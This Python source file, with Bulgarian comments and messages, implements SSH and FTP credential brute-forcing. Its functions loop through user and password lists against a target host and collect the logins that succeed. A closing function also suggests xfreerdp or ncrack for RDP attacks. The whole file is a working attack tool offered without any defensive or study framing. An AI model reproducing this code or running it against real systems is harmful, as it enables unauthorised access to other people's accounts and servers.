
import paramiko
import ftplib

def ssh_bruteforce(host, port, user_list, pass_list, timeout=3):
    """Опитва SSH брутфорс с дадени списъци от потребители и пароли."""
    found = []
    for username in user_list:
        for password in pass_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=username, password=password, timeout=timeout)
                found.append((username, password))
                client.close()
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                return f"[!] SSH грешка: {e}"
    return found if found else "[!] Неуспешна атака или невалидни комбинации."

def ftp_bruteforce(host, user_list, pass_list, timeout=3):
    """Опитва FTP брутфорс с речници."""
    found = []
    for username in user_list:
        for password in pass_list:
            try:
                ftp = ftplib.FTP(host, timeout=timeout)
                ftp.login(username, password)
                found.append((username, password))
                ftp.quit()
            except ftplib.error_perm:
                continue
            except Exception as e:
                return f"[!] FTP грешка: {e}"
    return found if found else "[!] Неуспешна атака или невалидни комбинации."

def rdp_bruteforce_notice():
    return "[*] RDP поддръжка: използвай xfreerdp или ncrack външно (пример: xfreerdp /u:user /p:pass /v:target)"
